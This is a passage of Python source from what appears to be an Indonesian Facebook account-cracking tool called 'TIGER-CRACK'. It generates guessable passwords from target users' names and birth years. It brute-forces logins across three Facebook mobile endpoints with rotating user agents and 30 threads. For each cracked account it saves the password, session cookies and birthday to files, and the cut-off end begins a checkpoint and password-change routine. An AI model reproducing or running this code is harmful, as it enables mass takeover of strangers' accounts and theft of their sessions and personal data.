							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						TitidNeverDie.submit(self.touch, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('2', '02'):
			print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						TitidNeverDie.submit(self.basic, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('3', '03'):
			print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123321", na[0]+"123123", na[0]+"12341234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"1985", na[0]+"1984", na[0]+"1983", na[0]+"1982", na[0]+"1981", na[0]+"1980", na[0]+"1986", na[0]+"1987", na[0]+"1988", na[0]+"1989", na[0]+"1990", na[0]+"1991", na[0]+"1992", na[0]+"1993", na[0]+"1994", na[0]+"1995", na[0]+"1996", na[0]+"1997", na[0]+"1998", na[0]+"1999", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"2003", na[0]+"2004", na[0]+"2005", na[0]+"2006", na[0]+"2007",]
						TitidNeverDie.submit(self.mobil, uid, pwx)
					except: pass
			hasil(ok,cp)
		else:
			print("%s%s Isi yang benar kentod "%(M,til))
			self.langsung()
			
	def touch(self, user, manual, **data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [TIGER-CRACK] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if "c_user" in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[TIGER-OK] %s : %s : %s %s %s : %s '%(H,user,pw,day,month,year,kukis))
						
						ok.append("%s : %s : %s %s %s : %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s : %s %s %s : %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[TIGER-OK] %s : %s : %s '%(H,user,pw))
					
					ok.append('%s : %s : %s'%(user,pw))
					open('OK/%s.txt'%(waktu), 'a').write(' [TIGER-OK] %s : %s : %s\n'%(user,pw))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[TIGER-OK] %s : %s : %s %s %s  '%(K,user,pw,day,month,year))
						
						cp.append("%s : %s : %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s : %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[TIGER-OK] %s : %s           '%(K,user,pw))
					
					cp.append('%s : %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.touch(user, manual, **data)
			
	def basic(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [TIGER-CRACK] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[TIGER-OK] %s : %s : %s %s %s : %s '%(H,user,pw,day,month,year,kukis))
						#
						ok.append("%s : %s : %s %s %s : %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s : %s %s %s : %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[TIGER-OK] %s : %s : %s '%(H,user,pw))
					#
					ok.append('%s : %s : %s'%(user,pw))
					open('OK/%s.txt'%(waktu), 'a').write(' [TIGER-OK] %s : %s : %s\n'%(user,pw))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[TIGER-OK] %s : %s : %s %s %s  '%(K,user,pw,day,month,year))
						#
						cp.append("%s : %s : %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s : %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[TIGER-OK] %s : %s           '%(K,user,pw))
					#
					cp.append('%s : %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.basic(user, manual, **data)
	
	def mobil(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [TIGER-CRACK] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[TIGER-OK] %s : %s : %s %s %s : %s '%(H,user,pw,day,month,year,kukis))
						
						ok.append("%s : %s : %s %s %s : %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s : %s %s %s : %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[TIGER-OK] %s : %s : %s '%(H,user,pw))
					
					ok.append('%s : %s : %s'%(user,pw))
					open('OK/%s.txt'%(waktu), 'a').write(' [TIGER-OK] %s : %s : %s\n'%(user,pw))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[TIGER-OK] %s : %s : %s %s %s  '%(K,user,pw,day,month,year))
						
						cp.append("%s : %s : %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s : %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[TIGER-OK] %s : %s           '%(K,user,pw))
					
					cp.append('%s : %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.mobil(user, manual, **data)

ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print("\n%s√ finished"%(H))
		print('%s+%s ---------------------------------------- %s+'%(P,M,P))
		print('%s• %sOK%s : %s%s'%(U,H,M,H,str(len(ok))))
		print('%s• %sCP%s : %s%s'%(U,K,M,K,str(len(cp))))
		print('%s+%s ---------------------------------------- %s+'%(P,M,P))
		if len(cp)==0:
			exit()
		else:
			c = input('\n%s%s%s gunakan detektor checkpoint? y/t%s > %s'%(U,til,O,M,K))
			if c =='':
				exit("%s%s Isi yang benar kentod "%(M,til))
			elif c in['Y','y']:
				jalan("\n%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
				pw=input("%s%s%s ubah sandi akun one tab? y/t %s> %s"%(U,til,O,M,K))
				if pw =='':
					print ("%s%s isi yg benar kentod "%(M,til))
				elif pw in['y','Y']:
					ubah_pass.append("ubah_sandi")
					pw2=input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
					if len(pw2) <= 5:
						print("%s%s sandi minimal 6 karakter "%(M,til))
					else:
						pwbaru.append(pw2)
				nomor=0
				for fb in cp:
					akun = fb.replace("\n","")
					ngecek  = akun.split(" : ")
					nomor+=1
					print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" [TIGER-OK] ","")));jeda(0.07)
					try:
